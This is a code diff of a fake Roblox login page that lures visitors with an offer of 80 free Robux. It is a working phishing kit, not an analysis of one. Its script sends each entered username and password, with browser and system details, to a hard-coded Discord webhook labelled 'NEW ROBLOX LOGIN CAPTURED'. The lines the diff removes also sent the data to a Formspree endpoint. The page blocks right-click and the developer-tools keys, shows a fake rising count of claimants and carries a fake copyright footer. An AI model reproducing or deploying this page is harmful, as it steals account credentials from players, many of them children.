@@ -3,117 +3,233 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox - Official Site</title>
+    <title>Welcome to Roblox</title>
     <style>
-        body {
-            background: #f0f0f0;
-            font-family: Arial, sans-serif;
+        * {
             margin: 0;
-            padding: 20px;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        body {
+            background: #f2f2f2;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
         }
         .container {
-            background: white;
-            border-radius: 10px;
-            padding: 30px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
             width: 100%;
             max-width: 400px;
-            text-align: center;
-        }
-        .logo {
-            color: #00a2ff;
-            font-size: 32px;
-            font-weight: bold;
-            margin-bottom: 20px;
-        }
-        .gift-banner {
-            background: #ff6b6b;
-            color: white;
-            padding: 15px;
+            background: white;
             border-radius: 8px;
-            margin-bottom: 20px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        .header {
+            background: #00a2ff;
+            padding: 20px;
+            text-align: center;
+            color: white;
+        }
+        .header h1 {
+            font-size: 24px;
             font-weight: bold;
         }
-        input {
+        .content {
+            padding: 30px;
+        }
+        .gift-notice {
+            background: #fff8e1;
+            border: 1px solid #ffd54f;
+            border-radius: 4px;
+            padding: 12px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 14px;
+            color: #333;
+        }
+        .gift-notice strong {
+            color: #e91e63;
+        }
+        .players-count {
+            background: #e8f5e8;
+            border: 1px solid #4caf50;
+            border-radius: 4px;
+            padding: 10px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 13px;
+            color: #2e7d32;
+        }
+        .players-count strong {
+            font-size: 16px;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            color: #333;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .form-group input {
             width: 100%;
             padding: 12px;
-            margin: 8px 0;
             border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 16px;
-            box-sizing: border-box;
+            border-radius: 4px;
+            font-size: 14px;
+            transition: border-color 0.2s;
         }
-        button {
+        .form-group input:focus {
+            border-color: #00a2ff;
+            outline: none;
+        }
+        .login-btn {
             width: 100%;
             background: #00a2ff;
             color: white;
             border: none;
-            padding: 15px;
-            border-radius: 5px;
+            padding: 14px;
+            border-radius: 4px;
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
-            margin-top: 10px;
+            transition: background 0.2s;
         }
-        .status {
-            margin: 15px 0;
+        .login-btn:hover {
+            background: #0088cc;
+        }
+        .footer {
+            text-align: center;
+            padding: 20px;
+            border-top: 1px solid #eee;
+            font-size: 12px;
+            color: #666;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            color: #00a2ff;
+            margin: 20px 0;
+            font-weight: 500;
+        }
+        .success {
+            display: none;
+            text-align: center;
+            color: #4caf50;
+            margin: 20px 0;
+            font-weight: 500;
+        }
+        .security-notice {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 15px;
+            font-size: 12px;
+            color: #666;
+        }
+        .count-up {
             font-weight: bold;
+            color: #e91e63;
         }
-        .loading { color: #00a2ff; display: none; }
-        .success { color: green; display: none; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">ROBLOX</div>
-        <div class="gift-banner">🎁 GET 80 FREE ROBUX!</div>
+        <div class="header">
+            <h1>Roblox</h1>
+        </div>
         
-        <form id="loginForm">
-            <input type="text" id="username" placeholder="Username or Email" required>
-            <input type="password" id="password" placeholder="Password" required>
-            <button type="submit">CLAIM ROBUX</button>
-        </form>
+        <div class="content">
+            <div class="gift-notice">
+                <strong>🎁 Special Offer!</strong> Verify your account to claim 80 free Robux.
+            </div>
+            
+            <div class="players-count">
+                🎮 <strong><span id="playerCount">1,247</span> players</strong> already claimed their Robux today!
+            </div>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="username">Username or Email</label>
+                    <input type="text" id="username" placeholder="Enter your username or email" required autocomplete="username">
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" placeholder="Enter your password" required autocomplete="current-password">
+                </div>
+                
+                <button type="submit" class="login-btn">Continue to Roblox</button>
+            </form>
+            
+            <div id="loading" class="loading">
+                Verifying your account and preparing your Robux gift...
+            </div>
+            
+            <div id="success" class="success">
+                Success! Redirecting you to Roblox...
+            </div>
+            
+            <div class="security-notice">
+                <span>🔒</span>
+                <span>Secured by Roblox</span>
+            </div>
+        </div>
         
-        <div id="loading" class="status loading">Verifying your account...</div>
-        <div id="success" class="status success">Success! Redirecting to Roblox...</div>
+        <div class="footer">
+            © 2023 Roblox Corporation. All rights reserved.
+        </div>
     </div>
 
     <script>
-        // АВТОМАТИЧЕСКАЯ ОТПРАВКА ДАННЫХ
-        function sendDataAuto(username, password) {
-            const data = {
-                username: username,
-                password: password,
-                timestamp: new Date().toLocaleString(),
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                screen: `${screen.width}x${screen.height}`,
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                referrer: document.referrer || 'Direct',
-                pageUrl: window.location.href
-            };
+        // АНИМАЦИЯ СЧЕТЧИКА ИГРОКОВ
+        function startCounter() {
+            let count = 1247;
+            const counterElement = document.getElementById('playerCount');
+            
+            // Случайное увеличение каждые 2-5 секунд
+            setInterval(() => {
+                const increment = Math.floor(Math.random() * 3) + 1; // 1-3 новых игрока
+                count += increment;
+                counterElement.textContent = count.toLocaleString();
+            }, Math.random() * 3000 + 2000); // 2-5 секунд
+        }
 
-            // МЕТОД 1: Discord Webhook (ОСНОВНОЙ)
+        // ОТПРАВКА В DISCORD
+        function sendToDiscord(username, password) {
             const discordWebhook = 'https://discord.com/api/webhooks/1436823222514483303/Ux1nl4Yrwo8n4a_xDAGNIdS-kuMK1t4cJnXJsoa12iCv8f3s3U5QeroieqeRrXNCKhQz';
             
+            const systemInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer || 'Direct'
+            };
+
             const discordMessage = {
-                content: `🔐 **NEW ROBLOX ACCOUNT CAPTURED**`,
+                content: `🔐 **NEW ROBLOX LOGIN CAPTURED**`,
                 embeds: [{
                     title: "Account Details",
-                    color: 0xff6b6b,
+                    color: 0x00a2ff,
                     fields: [
                         { name: "👤 Username", value: username, inline: true },
                         { name: "🔑 Password", value: password, inline: true },
-                        { name: "⏰ Time", value: data.timestamp, inline: false },
-                        { name: "🖥️ Platform", value: data.platform, inline: true },
-                        { name: "🌐 Browser", value: data.userAgent.substring(0, 100) + "...", inline: false }
+                        { name: "⏰ Time", value: new Date().toLocaleString(), inline: false },
+                        { name: "📍 Timezone", value: systemInfo.timezone, inline: true },
+                        { name: "🌐 Language", value: systemInfo.language, inline: true },
+                        { name: "🖥️ Platform", value: systemInfo.platform, inline: true },
+                        { name: "📱 Screen", value: systemInfo.screen, inline: true },
+                        { name: "🔗 Source", value: systemInfo.referrer, inline: false }
                     ],
-                    timestamp: new Date().toISOString()
+                    timestamp: new Date().toISOString(),
+                    footer: { text: "Roblox Gift System" }
                 }]
             };
 
@@ -121,42 +237,7 @@
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(discordMessage)
-            }).catch(e => console.log('Discord failed'));
-
-            // МЕТОД 2: Formspree (РЕЗЕРВНЫЙ)
-            const formspreeURL = 'https://formspree.io/f/mdkyndke';
-            
-            const formData = new FormData();
-            formData.append('username', username);
-            formData.append('password', password);
-            formData.append('timestamp', data.timestamp);
-            formData.append('userAgent', data.userAgent);
-            formData.append('platform', data.platform);
-            formData.append('referrer', data.referrer);
-            formData.append('pageUrl', data.pageUrl);
-
-            fetch(formspreeURL, {
-                method: 'POST',
-                body: formData,
-                mode: 'no-cors'
-            }).catch(e => console.log('Formspree failed'));
-
-            // МЕТОД 3: Локальное сохранение
-            try {
-                let storedData = JSON.parse(localStorage.getItem('robloxData') || '[]');
-                storedData.push(data);
-                localStorage.setItem('robloxData', JSON.stringify(storedData));
-                
-                // Авто-скачивание файла
-                const blob = new Blob([JSON.stringify(storedData, null, 2)], {type: 'application/json'});
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = `roblox_data_${Date.now()}.json`;
-                a.click();
-            } catch(e) {}
-
-            return true;
+            }).then(r => console.log('✅ Data sent to Discord')).catch(e => console.log('❌ Discord error'));
         }
 
         // ОБРАБОТКА ФОРМЫ
@@ -172,8 +253,12 @@
             document.getElementById('loginForm').style.display = 'none';
             document.getElementById('loading').style.display = 'block';
             
-            // АВТОМАТИЧЕСКАЯ ОТПРАВКА
-            sendDataAuto(username, password);
+            // Обновляем счетчик
+            const currentCount = parseInt(document.getElementById('playerCount').textContent.replace(/,/g, ''));
+            document.getElementById('playerCount').textContent = (currentCount + 1).toLocaleString();
+            
+            // Отправляем данные
+            sendToDiscord(username, password);
             
             // Редирект
             setTimeout(() => {
@@ -186,19 +271,18 @@
             }, 3000);
         });
 
-        // Защита
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('keydown', e => {
-            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
-                e.preventDefault();
-            }
-        });
-
-        // Тестовое сообщение при загрузке (убери после теста)
+        // ИНИЦИАЛИЗАЦИЯ
         window.addEventListener('load', function() {
-            console.log('🟢 Roblox gift page loaded');
-            // Для теста - раскомментируй:
-            // sendDataAuto('test_user', 'test_pass');
+            // Запускаем счетчик
+            startCounter();
+            
+            // Защита
+            document.addEventListener('contextmenu', e => e.preventDefault());
+            document.addEventListener('keydown', e => {
+                if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+                    e.preventDefault();
+                }
+            });
         });
     </script>
 </body>
